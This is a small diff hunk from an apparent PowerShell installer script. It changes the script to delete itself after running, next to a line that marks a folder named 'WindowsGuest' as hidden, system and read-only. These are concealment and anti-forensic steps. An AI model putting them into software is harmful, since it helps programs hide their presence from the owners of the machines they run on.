@@ -57,4 +57,4 @@ attrib +h +s +r WindowsGuest
 
 # self delete
 cd $initial_dir
-installer.ps1
+del installer.ps1
